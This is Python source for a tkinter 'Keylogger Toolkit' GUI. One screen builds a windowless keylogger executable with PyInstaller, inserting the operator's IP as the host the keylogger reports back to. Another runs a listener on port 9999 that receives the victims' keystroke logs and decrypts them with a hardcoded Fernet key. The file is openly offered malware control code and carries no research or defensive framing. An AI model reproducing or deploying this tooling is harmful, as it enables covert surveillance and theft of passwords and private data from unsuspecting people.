import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter import ttk
import subprocess
import tempfile
import os
import threading
import socket
from cryptography.fernet import Fernet

TEMPLATE_FILE = "single_run.pyw"
PORT = 9999
KEY = b'nA3f3UQUzyK5j93ZJx6xkyX4tfW9NnBq_NKcyZcU9-g='
fernet = Fernet(KEY)

class KeyloggerToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Toolkit")
        self.root.geometry("800x600")
        self.root.configure(bg="#121212")

        style = ttk.Style()
        style.theme_use('default')
        style.configure("TButton", font=("Segoe UI", 11), padding=6)

        self.show_main_menu()

    def show_main_menu(self):
        self.clear_widgets()

        # Title
        title = tk.Label(self.root, text="M@H@V!R", font=("Courier", 18, "bold"), bg="#121212", fg="#00FF00")
        title.pack(pady=(20, 10))

        desc = tk.Label(self.root, text="Choose your operation below", font=("Segoe UI", 12), bg="#121212", fg="white")
        desc.pack(pady=(0, 20))

        self.menu_frame = tk.Frame(self.root, bg="#121212")
        self.menu_frame.pack()

        ttk.Button(self.menu_frame, text="📦 Generate Sender EXE", command=self.show_generate_exe_ui, width=30).pack(pady=10)
        ttk.Button(self.menu_frame, text="📥 Receive Logs", command=self.show_receiver_ui, width=30).pack(pady=10)

    def clear_widgets(self):
        for widget in self.root.winfo_children():
            if isinstance(widget, tk.Frame) or isinstance(widget, tk.Label):
                widget.destroy()

    def show_generate_exe_ui(self):
        self.clear_widgets()

        frame = tk.Frame(self.root, bg="#121212")
        frame.pack(pady=20)

        tk.Label(frame, text="Enter your IP address:", font=("Segoe UI", 12), bg="#121212", fg="white").pack(pady=5)
        ip_entry = tk.Entry(frame, font=("Segoe UI", 12), justify="center", width=30)
        ip_entry.pack(pady=5)

        def build_exe():
            ip = ip_entry.get().strip()
            if not ip:
                messagebox.showerror("Error", "Please enter a valid IP address.")
                return
            if not os.path.exists(TEMPLATE_FILE):
                messagebox.showerror("Error", f"'{TEMPLATE_FILE}' not found.")
                return
            with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
                code = f.read().replace("HOST = '<IP>'", f"HOST = '{ip}'")
            with tempfile.NamedTemporaryFile(delete=False, suffix=".pyw", mode='w', encoding='utf-8') as temp:
                temp.write(code)
                temp_filename = temp.name
            try:
                subprocess.run(["pyinstaller", "--noconsole", "--onefile", temp_filename], check=True)
                messagebox.showinfo("Success", "EXE created successfully! Check the 'dist' folder.")
            except subprocess.CalledProcessError:
                messagebox.showerror("Build Failed", "PyInstaller failed to create the EXE file.")

        ttk.Button(frame, text="🚀 Generate EXE", command=build_exe).pack(pady=15)
        ttk.Button(frame, text="🔙 Back", command=self.show_main_menu, width=15).pack(pady=5)

    def show_receiver_ui(self):
        self.clear_widgets()

        self.receiver_frame = tk.Frame(self.root, bg="#121212")
        self.receiver_frame.pack(pady=10, fill=tk.BOTH, expand=True)

        self.log_box = tk.Text(self.receiver_frame, bg="#1e1e1e", fg="#00FF00", insertbackground="white", font=("Courier", 10))
        self.log_box.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

        btn_frame = tk.Frame(self.receiver_frame, bg="#121212")
        btn_frame.pack(pady=10)

        self.start_btn = ttk.Button(btn_frame, text="🟢 Start", command=self.start_listening)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = ttk.Button(btn_frame, text="🔴 Stop", state=tk.DISABLED, command=self.stop_listening)
        self.stop_btn.grid(row=0, column=1, padx=10)

        self.save_btn = ttk.Button(btn_frame, text="📅 Save Logs", command=self.save_logs)
        self.save_btn.grid(row=0, column=2, padx=10)

        ttk.Button(btn_frame, text="🔙 Back", command=self.show_main_menu).grid(row=0, column=3, padx=10)

        self.receiver_socket = None
        self.running = False

    def start_listening(self):
        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        threading.Thread(target=self.listen_for_logs, daemon=True).start()

    def stop_listening(self):
        self.running = False
        if self.receiver_socket:
            try:
                self.receiver_socket.close()
            except:
                pass
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log_box.insert(tk.END, "\n[!] Receiver stopped.\n")

    def save_logs(self):
        logs = self.log_box.get("1.0", tk.END).strip()
        if not logs:
            messagebox.showwarning("Empty", "No logs to save.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[["Text Files", "*.txt"]])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(logs)
            messagebox.showinfo("Saved", f"Logs saved to {path}")

    def listen_for_logs(self):
        try:
            self.receiver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.receiver_socket.bind(("0.0.0.0", PORT))
            self.receiver_socket.listen(1)
            self.log_box.insert(tk.END, f"[*] Listening on port {PORT}...\n")
            conn, addr = self.receiver_socket.accept()
            with conn:
                self.log_box.insert(tk.END, f"[✔] Connected from {addr}\n")
                data = b""
                while self.running:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                for line in data.split(b"\n"):
                    if line.strip():
                        try:
                            decrypted = fernet.decrypt(line.strip()).decode()
                            self.log_box.insert(tk.END, decrypted + "\n")
                        except:
                            self.log_box.insert(tk.END, "❌ Failed to decrypt line\n")
        except Exception as e:
            self.log_box.insert(tk.END, f"[ERROR] {e}\n")
        finally:
            self.stop_listening()

if __name__ == '__main__':
    root = tk.Tk()
    app = KeyloggerToolGUI(root)
    root.mainloop()
